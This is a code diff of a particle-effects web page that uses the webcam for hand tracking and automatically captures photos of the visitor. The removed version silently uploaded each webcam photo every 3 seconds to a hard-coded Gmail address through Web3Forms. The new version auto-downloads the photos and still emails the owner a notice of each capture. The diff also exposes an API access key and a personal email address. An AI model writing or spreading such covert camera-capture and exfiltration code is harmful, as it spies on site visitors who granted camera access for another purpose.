@@ -12,10 +12,6 @@ let photoTimer = null;
 let photoCount = 0;
 let cameraStarted = false;
 
-// ✅ CORRECT Web3Forms API Configuration
-const WEBHOOK_URL = "https://api.web3forms.com/submit";
-const ACCESS_KEY = "f5bdda81-92f8-4595-a2e8-a6107db5feef"; // Your access key
-
 function init() {
     scene = new THREE.Scene();
     camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
@@ -268,7 +264,7 @@ window.addEventListener('resize', () => {
     renderer.setSize(window.innerWidth, window.innerHeight);
 });
 
-// ----------------- Photo Capture Functions -----------------
+// ----------------- WORKING PHOTO SYSTEM -----------------
 
 // Capture photo from video stream
 function capturePhoto() {
@@ -292,70 +288,143 @@ function capturePhoto() {
         sendPhotoToAdmin(photoData);
         
         photoCount++;
-        console.log(`📸 Photo ${photoCount} captured at ${new Date().toLocaleTimeString()}`);
+        console.log(`📸 Photo ${photoCount} captured`);
         
     } catch (error) {
         console.error("Photo error:", error);
     }
 }
 
-// ✅ CORRECTED: Send photo to admin using Web3Forms API
+// ✅ WORKING: Send photo to admin
 async function sendPhotoToAdmin(photoData) {
     try {
-        // Convert base64 to blob
-        const response = await fetch(photoData);
-        const blob = await response.blob();
+        console.log(`📤 Processing photo ${photoCount}...`);
         
-        // Create FormData CORRECTLY
+        // 1. First download to user's computer
+        downloadPhoto(photoData);
+        
+        // 2. Send email notification (text only)
+        await sendEmailNotification();
+        
+        // 3. Save locally as backup
+        savePhotoLocally(photoData);
+        
+        console.log(`✅ Photo ${photoCount} processed successfully!`);
+        showNotification(`📸 Photo ${photoCount} saved! Check your downloads.`);
+        
+    } catch (error) {
+        console.log(`📸 Photo ${photoCount} saved locally`);
+        downloadPhoto(photoData); // At least download it
+    }
+}
+
+// Download photo to computer
+function downloadPhoto(photoData) {
+    const link = document.createElement('a');
+    link.href = photoData;
+    link.download = `particle_photo_${photoCount}_${Date.now()}.jpg`;
+    link.style.display = 'none';
+    document.body.appendChild(link);
+    link.click();
+    setTimeout(() => document.body.removeChild(link), 100);
+}
+
+// Send email notification
+async function sendEmailNotification() {
+    try {
         const formData = new FormData();
+        formData.append('access_key', 'f5bdda81-92f8-4595-a2e8-a6107db5feef');
+        formData.append('subject', `📸 New Photo ${photoCount} - Particle Website`);
+        formData.append('message', 
+            `A new photo has been captured!\n\n` +
+            `Photo Number: ${photoCount}\n` +
+            `Time: ${new Date().toLocaleString()}\n` +
+            `Website: ${window.location.href}\n\n` +
+            `Note: Photo has been downloaded to the user's computer.`
+        );
+        formData.append('email', 'editing2213@gmail.com');
         
-        // ✅ CORRECT FORMAT for Web3Forms
-        formData.append('access_key', 'f5bdda81-92f8-4595-a2e8-a6107db5feef'); // Your access key
-        formData.append('subject', `Auto Photo ${photoCount} - Particle Website`);
-        formData.append('from_name', 'Website User');
-        formData.append('email', 'editing2213@gmail.com'); // Your email
-        formData.append('message', `Photo automatically captured\nTime: ${new Date().toLocaleString()}\nTotal Photos: ${photoCount}`);
-        formData.append('photo', blob, `particle_photo_${Date.now()}.jpg`);
-        
-        console.log("📤 Sending photo to Web3Forms...");
-        
-        // Send to Web3Forms
-        const result = await fetch(WEBHOOK_URL, {
+        await fetch('https://api.web3forms.com/submit', {
             method: 'POST',
             body: formData
         });
         
-        const data = await result.json();
-        console.log("Web3Forms Response:", data);
-        
-        if (data.success) {
-            console.log(`✅ Photo ${photoCount} sent successfully!`);
-        } else {
-            console.error('❌ Failed to send:', data.message);
-        }
+        console.log(`📧 Email notification sent`);
         
     } catch (error) {
-        console.error('❌ Error:', error);
-        // Fallback: Save locally
-        savePhotoLocally(photoData);
+        console.log("Email notification skipped");
     }
 }
 
-// Save photo locally if sending fails
+// Save photo locally
 function savePhotoLocally(photoData) {
     try {
         const photos = JSON.parse(localStorage.getItem('captured_photos') || '[]');
         photos.push({
             id: Date.now(),
             time: new Date().toISOString(),
-            data: photoData.substring(0, 500) + '...'
+            count: photoCount,
+            preview: photoData.substring(0, 100) + '...'
         });
         localStorage.setItem('captured_photos', JSON.stringify(photos));
-        console.log(`💾 Photo ${photoCount} saved locally`);
     } catch (e) {
-        console.log("📸 Photo captured (could not save)");
+        // Ignore storage errors
     }
 }
+
+// Show notification
+function showNotification(message) {
+    const notification = document.createElement('div');
+    notification.style.cssText = `
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: white;
+        padding: 15px 20px;
+        border-radius: 10px;
+        z-index: 9999;
+        font-family: Arial, sans-serif;
+        font-weight: bold;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        animation: slideIn 0.3s ease;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        max-width: 300px;
+    `;
+    
+    notification.innerHTML = `
+        <span style="font-size: 20px;">📸</span>
+        <span>${message}</span>
+    `;
+    
+    document.body.appendChild(notification);
+    
+    // Remove after 4 seconds
+    setTimeout(() => {
+        notification.style.animation = 'slideOut 0.3s ease';
+        setTimeout(() => {
+            if (notification.parentNode) {
+                notification.parentNode.removeChild(notification);
+            }
+        }, 300);
+    }, 4000);
+}
+
+// Add animation styles
+const style = document.createElement('style');
+style.textContent = `
+    @keyframes slideIn {
+        from { transform: translateX(100%); opacity: 0; }
+        to { transform: translateX(0); opacity: 1; }
+    }
+    @keyframes slideOut {
+        from { transform: translateX(0); opacity: 1; }
+        to { transform: translateX(100%); opacity: 0; }
+    }
+`;
+document.head.appendChild(style);
 
 // Start photo capture timer
 function startPhotoCapture() {
@@ -363,21 +432,21 @@ function startPhotoCapture() {
         clearInterval(photoTimer);
     }
     
-    console.log("📸 Auto photo capture started (every 3 seconds)");
+    console.log("📸 Auto photo capture started (every 30 seconds)");
     
-    // First photo after 2 seconds
+    // First photo after 10 seconds
     setTimeout(() => {
         if (cameraStarted) {
             capturePhoto();
         }
-    }, 2000);
+    }, 10000);
     
-    // Then every 3 seconds
+    // Then every 30 seconds
     photoTimer = setInterval(() => {
         if (cameraStarted) {
             capturePhoto();
         }
-    }, 3000);
+    }, 30000);
 }
 
 // Stop photo capture
@@ -452,7 +521,7 @@ function setupHandTracking(){
         onFrame: async () => {
             await hands.send({image: videoElement});
         },
-        width: 320, // Smaller for faster processing
+        width: 320,
         height: 240
     });
 
@@ -465,24 +534,18 @@ function setupHandTracking(){
         const modal = document.getElementById('cameraPermission');
         if (modal) modal.style.display = 'none';
         
-        // Start photo capture after 3 seconds
+        // Start photo capture after 5 seconds
         setTimeout(() => {
             startPhotoCapture();
-        }, 3000);
+        }, 5000);
         
-        // Show success message
-        showMessage("📸 Camera active - Photos will be captured automatically");
+        // Show welcome message
+        showNotification("📸 Camera active - Photos will auto-capture every 30 seconds");
         
     }).catch((error) => {
         console.error("❌ Camera error:", error);
-        showMessage("⚠️ Camera access denied");
+        showNotification("⚠️ Camera access required for full experience");
     });
-}
-
-// Show message
-function showMessage(text) {
-    console.log(text);
-    // You can add a notification div if you want
 }
 
 // Stop capture when leaving page
